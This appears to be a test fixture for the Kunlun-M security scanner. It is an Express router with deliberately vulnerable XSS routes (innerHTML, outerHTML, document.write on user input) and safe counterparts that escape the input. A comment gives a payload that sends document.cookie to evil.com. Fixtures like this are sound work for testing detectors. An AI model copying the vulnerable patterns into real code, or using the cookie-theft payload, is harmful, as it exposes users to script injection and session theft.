/**
 * Real-world XSS test cases for Kunlun-M scanner
 * Tests: innerHTML, outerHTML assignment with user-controlled input
 * Note: In server-side Node.js context, XSS typically occurs when generating
 * HTML that is sent to the client without escaping, or when using
 * client-side DOM manipulation patterns in server-rendered templates.
 */

const express = require('express');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
const router = express.Router();

router.use(express.json());
router.use(express.urlencoded({ extended: true }));

/**
 * VULN: Stored XSS via innerHTML with req.body HTML content
 * User-supplied HTML is inserted directly via innerHTML
 * Example POST: {"comment": "<img src=x onerror=alert(document.cookie)>"}
 */
router.post('/comments', (req, res) => {
    const comment = req.body.comment;
    const dom = new JSDOM(`<!DOCTYPE html><div id="container"></div>`);
    const container = dom.window.document.getElementById('container');
    // VULN: Direct innerHTML assignment with user input enables script injection
    container.innerHTML = comment;
    res.send(dom.serialize());
});

/**
 * VULN: XSS via outerHTML with req.query banner content
 * Attacker can inject script tags via outerHTML
 * Example: /banner?text=<script>document.location='http://evil.com/?c='+document.cookie</script>
 */
router.get('/banner', (req, res) => {
    const text = req.query.text;
    const dom = new JSDOM(`<!DOCTYPE html><div id="banner"></div>`);
    const banner = dom.window.document.getElementById('banner');
    // VULN: outerHTML assignment with user input enables XSS
    banner.outerHTML = `<div class="banner">${text}</div>`;
    res.send(dom.serialize());
});

/**
 * VULN: XSS via document.write with req.params content
 * document.write with user content is equivalent to innerHTML injection
 * Example: /page/<script>alert(1)</script>
 */
router.get('/page/:content', (req, res) => {
    const content = req.params.content;
    const dom = new JSDOM(`<!DOCTYPE html><html><body></body></html>`);
    // VULN: document.write with user input enables script injection
    dom.window.document.write(`<html><body>${content}</body></html>`);
    dom.window.document.close();
    res.send(dom.serialize());
});

/**
 * SAFE: Using textContent instead of innerHTML
 * textContent treats user input as plain text, preventing script injection
 */
router.post('/safe-comments', (req, res) => {
    const comment = req.body.comment;
    const dom = new JSDOM(`<!DOCTYPE html><div id="container"></div>`);
    const container = dom.window.document.getElementById('container');
    // SAFE: textContent safely escapes HTML entities, preventing XSS
    container.textContent = comment;
    res.send(dom.serialize());
});

/**
 * SAFE: HTML escaping before inserting into template
 * Escaping <, >, &, ", ' characters neutralizes XSS payloads
 */
router.get('/safe-banner', (req, res) => {
    const text = req.query.text;
    // SAFE: Escape HTML special characters before rendering in template
    const escapeHtml = (str) => {
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    };
    const safeText = escapeHtml(text);
    res.send(`<div class="banner">${safeText}</div>`);
});

module.exports = router;
